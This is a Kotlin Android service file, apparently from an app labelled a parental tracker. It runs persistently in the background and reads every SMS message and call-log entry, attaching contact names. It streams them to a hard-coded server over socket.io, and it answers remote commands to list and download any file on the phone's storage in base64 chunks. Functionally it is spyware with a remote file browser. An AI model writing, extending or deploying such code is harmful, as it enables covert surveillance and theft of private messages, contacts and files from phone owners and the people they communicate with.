package com.parentaltracker

import android.app.*
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.File
import java.net.URISyntaxException
import android.os.BatteryManager
import android.content.IntentFilter
import android.content.BroadcastReceiver
import android.os.Environment

class MonitoringService : Service() {

    private var socket: Socket? = null
    private var deviceId: String = ""
    private var deviceName: String = ""
    private var deviceModel: String = ""
    private val handler = Handler(Looper.getMainLooper())
    private var heartbeatRunnable: Runnable? = null

    // Server URL - Change this to your server URL
    private val SERVER_URL = "http://192.168.31.53:3000"

    private lateinit var smsObserver: ContentObserver
    private lateinit var callObserver: ContentObserver
    private lateinit var contentResolver: ContentResolver

    private var lastSmsId: Long = 0
    private var lastCallId: Long = 0
    private var batteryLevel: Int = 0
    private var isCharging: Boolean = false

    private val batteryReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val status = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1

            batteryLevel = (level * 100 / scale.toFloat()).toInt()
            isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == BatteryManager.BATTERY_STATUS_FULL
        }
    }

    override fun onCreate() {
        super.onCreate()

        try {
            createNotificationChannel()
            startForeground(NOTIFICATION_ID, createNotification())

            contentResolver = applicationContext.contentResolver

            // Initialize device info
            deviceId = android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: ""
            deviceName = Build.MANUFACTURER
            deviceModel = Build.MODEL

            // Register battery receiver
            val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            registerReceiver(batteryReceiver, filter)

            // Setup observers
            setupObservers()

            // Connect to server
            connectToServer()

            // Start heartbeat
            startHeartbeat()
        } catch (e: Exception) {
            e.printStackTrace()
            // Ensure notification is shown even if other setup fails
            try {
                createNotificationChannel()
                startForeground(NOTIFICATION_ID, createNotification())
            } catch (ex: Exception) {
                ex.printStackTrace()
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Device Tracker Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Running in background to monitor device"
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            Notification.Builder(this)
        }

        return builder
            .setContentTitle("Device Tracker")
            .setContentText("Monitoring active")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_LOW)
            .build()
    }

    private fun setupObservers() {
        // SMS Observer
        smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                checkNewSMS()
            }
        }
        contentResolver.registerContentObserver(
            Telephony.Sms.CONTENT_URI,
            true,
            smsObserver
        )

        // Call Log Observer
        callObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                checkNewCalls()
            }
        }
        contentResolver.registerContentObserver(
            CallLog.Calls.CONTENT_URI,
            true,
            callObserver
        )
    }

    private fun connectToServer() {
        try {
            val opts = IO.Options().apply {
                reconnection = true
                reconnectionAttempts = Integer.MAX_VALUE
                reconnectionDelay = 2000
                timeout = 10000
                forceNew = false
            }

            socket = IO.socket(SERVER_URL, opts)

            socket?.on(Socket.EVENT_CONNECT) {
                try {
                    sendDeviceInfo()
                    // Load all existing SMS and Calls when connected
                    loadAllExistingSMS()
                    loadAllExistingCalls()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                // Auto-reconnect handled by socket.io
            }

            socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
                // Auto-reconnect handled by socket.io
                handler.postDelayed({
                    try {
                        socket?.connect()
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }, 5000)
            }

            socket?.on("requestFiles") { args ->
                try {
                    val path = args[0] as? String ?: "/"
                    sendFileList(path)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            socket?.on("requestFileDownload") { args ->
                try {
                    val filePath = args[0] as? String ?: ""
                    sendFileChunk(filePath, 0)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            socket?.on("requestFileChunk") { args ->
                try {
                    val filePath = args[0] as? String ?: ""
                    val offset = (args[1] as? Number)?.toLong() ?: 0L
                    sendFileChunk(filePath, offset)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            socket?.connect()
        } catch (e: Exception) {
            e.printStackTrace()
            // Retry connection after delay
            handler.postDelayed({
                connectToServer()
            }, 5000)
        }
    }

    private fun sendDeviceInfo() {
        val info = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceName", deviceName)
            put("deviceModel", deviceModel)
            put("battery", batteryLevel)
            put("charging", isCharging)
        }
        socket?.emit("deviceInfo", info)
    }

    private fun startHeartbeat() {
        heartbeatRunnable = object : Runnable {
            override fun run() {
                sendDeviceInfo()
                handler.postDelayed(this, 5000) // Every 5 seconds
            }
        }
        handler.post(heartbeatRunnable!!)
    }

    private fun checkNewSMS() {
        if (ActivityCompat.checkSelfPermission(
                this,
                android.Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return
        }

        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.TYPE,
                Telephony.Sms.DATE
            ),
            "${Telephony.Sms._ID} > ?",
            arrayOf(lastSmsId.toString()),
            "${Telephony.Sms._ID} DESC"
        )

        cursor?.use {
            while (it.moveToNext()) {
                val id = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms._ID))
                val number = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: ""
                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))

                val smsType = when (type) {
                    Telephony.Sms.MESSAGE_TYPE_INBOX -> "incoming"
                    Telephony.Sms.MESSAGE_TYPE_SENT -> "outgoing"
                    else -> "unknown"
                }

                val smsData = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("number", number)
                    put("body", body)
                    put("type", smsType)
                    put("date", date)
                }

                socket?.emit("newSMS", smsData)

                if (id > lastSmsId) {
                    lastSmsId = id
                }
            }
        }
    }

    private fun loadAllExistingSMS() {
        if (ActivityCompat.checkSelfPermission(
                this,
                android.Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return
        }

        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.TYPE,
                Telephony.Sms.DATE
            ),
            null,
            null,
            "${Telephony.Sms._ID} DESC" // Latest first
        )

        cursor?.use {
            var count = 0
            val maxSms = 2000 // Avoid sending an unbounded history
            while (it.moveToNext() && count < maxSms) {
                try {
                    val id = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms._ID))
                    val number = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: ""
                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                    val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                    val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))

                    val smsType = when (type) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "incoming"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "outgoing"
                        else -> "unknown"
                    }

                    val smsData = JSONObject().apply {
                        put("deviceId", deviceId)
                        put("number", number)
                        put("body", body)
                        put("type", smsType)
                        put("date", date)
                    }

                    socket?.emit("newSMS", smsData)

                    if (id > lastSmsId) {
                        lastSmsId = id
                    }

                    count++
                    // Small pause every so often to keep socket responsive
                    if (count % 50 == 0) {
                        Thread.sleep(100)
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }

    private fun loadAllExistingCalls() {
        if (ActivityCompat.checkSelfPermission(
                this,
                android.Manifest.permission.READ_CALL_LOG
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return
        }

        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE,
                "subscription_id",
                CallLog.Calls.PHONE_ACCOUNT_ID,
                "phone_account_id"
            ),
            null,
            null,
            "${CallLog.Calls._ID} DESC" // Last calls first
        )

        cursor?.use {
            var count = 0
            val maxCalls = 1000 // Limit to last 1000 calls to avoid overwhelming
            while (it.moveToNext() && count < maxCalls) {
                try {
                    val id = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls._ID))
                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: ""
                    val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val duration = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    val simId = getCursorString(it, "subscription_id")
                        ?: getCursorString(it, CallLog.Calls.PHONE_ACCOUNT_ID)
                        ?: getCursorString(it, "phone_account_id")
                    val contactName = getContactName(number) ?: ""
                    val simSlot = resolveSimSlot(simId)

                    val callType = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        else -> "unknown"
                    }

                    val callData = JSONObject().apply {
                        put("deviceId", deviceId)
                        put("number", number)
                        put("type", callType)
                        put("duration", duration)
                        put("date", date)
                        put("contactName", contactName)
                        put("simSlot", simSlot)
                        put("simId", simId ?: "")
                    }

                    socket?.emit("newCall", callData)

                    if (id > lastCallId) {
                        lastCallId = id
                    }

                    count++
                    // Small delay to avoid overwhelming the socket
                    if (count % 50 == 0) {
                        Thread.sleep(100)
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }

    private fun checkNewCalls() {
        if (ActivityCompat.checkSelfPermission(
                this,
                android.Manifest.permission.READ_CALL_LOG
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return
        }

        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE,
                "subscription_id",
                CallLog.Calls.PHONE_ACCOUNT_ID,
                "phone_account_id"
            ),
            "${CallLog.Calls._ID} > ?",
            arrayOf(lastCallId.toString()),
            "${CallLog.Calls._ID} DESC"
        )

        cursor?.use {
            while (it.moveToNext()) {
                try {
                    val id = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls._ID))
                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: ""
                    val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val duration = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    val simId = getCursorString(it, "subscription_id")
                        ?: getCursorString(it, CallLog.Calls.PHONE_ACCOUNT_ID)
                        ?: getCursorString(it, "phone_account_id")
                    val contactName = getContactName(number) ?: ""
                    val simSlot = resolveSimSlot(simId)

                    val callType = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        else -> "unknown"
                    }

                    val callData = JSONObject().apply {
                        put("deviceId", deviceId)
                        put("number", number)
                        put("type", callType)
                        put("duration", duration)
                        put("date", date)
                        put("contactName", contactName)
                        put("simSlot", simSlot)
                        put("simId", simId ?: "")
                    }

                    socket?.emit("newCall", callData)

                    if (id > lastCallId) {
                        lastCallId = id
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }

    private fun getContactName(number: String): String? {
        if (number.isBlank()) return null
        if (ActivityCompat.checkSelfPermission(
                this,
                android.Manifest.permission.READ_CONTACTS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return null
        }

        val lookupUri = Uri.withAppendedPath(
            ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
            Uri.encode(number)
        )

        contentResolver.query(
            lookupUri,
            arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
            null,
            null,
            null
        )?.use { cursor ->
            if (cursor.moveToFirst()) {
                return cursor.getString(
                    cursor.getColumnIndexOrThrow(ContactsContract.PhoneLookup.DISPLAY_NAME)
                )
            }
        }
        return null
    }

    private fun getCursorString(cursor: Cursor, columnName: String): String? {
        val index = cursor.getColumnIndex(columnName)
        return if (index != -1) cursor.getString(index) else null
    }

    private fun resolveSimSlot(simId: String?): String {
        val cleaned = simId?.trim() ?: return "unknown"
        val num = cleaned.toIntOrNull()
        return when (num) {
            1 -> "SIM1"
            2 -> "SIM2"
            else -> cleaned
        }
    }

    private fun sendFileList(path: String) {
        try {
            val root = Environment.getExternalStorageDirectory()
            val currentPath = if (path == "/") root else File(root, path)

            if (!currentPath.exists() || !currentPath.canRead()) {
                val errorResponse = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("path", path)
                    put("error", "Cannot access path")
                    put("files", org.json.JSONArray())
                }
                socket?.emit("fileList", errorResponse)
                return
            }

            val fileList = mutableListOf<Map<String, Any>>()

            if (currentPath.isDirectory) {
                val files = currentPath.listFiles()
                if (files != null) {
                    // Sort: directories first, then files (both alphabetically)
                    val sortedFiles = files.sortedWith(compareBy(
                        { !it.isDirectory },
                        { it.name.lowercase() }
                    ))

                    sortedFiles.forEach { file ->
                        try {
                            fileList.add(mapOf(
                                "name" to file.name,
                                "path" to file.absolutePath.replace(root.absolutePath, ""),
                                "isDirectory" to file.isDirectory,
                                "size" to file.length(),
                                "isHidden" to file.name.startsWith(".")
                            ))
                        } catch (e: Exception) {
                            // Skip files that can't be accessed
                            e.printStackTrace()
                        }
                    }
                }
            }

            val response = JSONObject().apply {
                put("deviceId", deviceId)
                put("path", path)
                put("files", org.json.JSONArray(fileList))
            }

            socket?.emit("fileList", response)
        } catch (e: Exception) {
            e.printStackTrace()
            val errorResponse = JSONObject().apply {
                put("deviceId", deviceId)
                put("path", path)
                put("error", e.message ?: "Unknown error")
                put("files", org.json.JSONArray())
            }
            socket?.emit("fileList", errorResponse)
        }
    }

    private fun sendFileChunk(filePath: String, offset: Long) {
        try {
            val root = Environment.getExternalStorageDirectory()
            val file = File(root, filePath)

            if (!file.exists() || !file.isFile || !file.canRead()) {
                val errorResponse = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("filePath", filePath)
                    put("error", "Cannot read file")
                }
                socket?.emit("fileChunk", errorResponse)
                return
            }

            val fileSize = file.length()
            val chunkSize = 256 * 1024 // 256KB chunks (Base64 encode করার পর ~340KB হবে)
            val remaining = fileSize - offset
            val bytesToRead = if (remaining > chunkSize) chunkSize else remaining.toInt()

            if (bytesToRead <= 0 || offset >= fileSize) {
                // File download complete
                val completeResponse = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("filePath", filePath)
                    put("complete", true)
                    put("offset", fileSize)
                    put("totalSize", fileSize)
                    put("data", "")
                }
                socket?.emit("fileChunk", completeResponse)
                return
            }

            file.inputStream().use { inputStream ->
                inputStream.skip(offset)
                val buffer = ByteArray(bytesToRead)
                val bytesRead = inputStream.read(buffer)

                if (bytesRead > 0) {
                    val base64Data = android.util.Base64.encodeToString(
                        buffer, 0, bytesRead, android.util.Base64.NO_WRAP
                    )

                    val chunkResponse = JSONObject().apply {
                        put("deviceId", deviceId)
                        put("filePath", filePath)
                        put("offset", offset)
                        put("totalSize", fileSize)
                        put("chunkSize", bytesRead)
                        put("data", base64Data)
                        put("complete", offset + bytesRead >= fileSize)
                    }

                    socket?.emit("fileChunk", chunkResponse)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
            val errorResponse = JSONObject().apply {
                put("deviceId", deviceId)
                put("filePath", filePath)
                put("error", e.message ?: "Unknown error")
            }
            socket?.emit("fileChunk", errorResponse)
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            heartbeatRunnable?.let {
                handler.removeCallbacks(it)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        try {
            contentResolver.unregisterContentObserver(smsObserver)
        } catch (e: Exception) {
            e.printStackTrace()
        }

        try {
            contentResolver.unregisterContentObserver(callObserver)
        } catch (e: Exception) {
            e.printStackTrace()
        }

        try {
            unregisterReceiver(batteryReceiver)
        } catch (e: Exception) {
            e.printStackTrace()
        }

        try {
            socket?.disconnect()
            socket?.off()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        // Return START_STICKY to restart service if killed
        return START_STICKY
    }

    companion object {
        private const val CHANNEL_ID = "DeviceTrackerChannel"
        private const val NOTIFICATION_ID = 1
    }
}
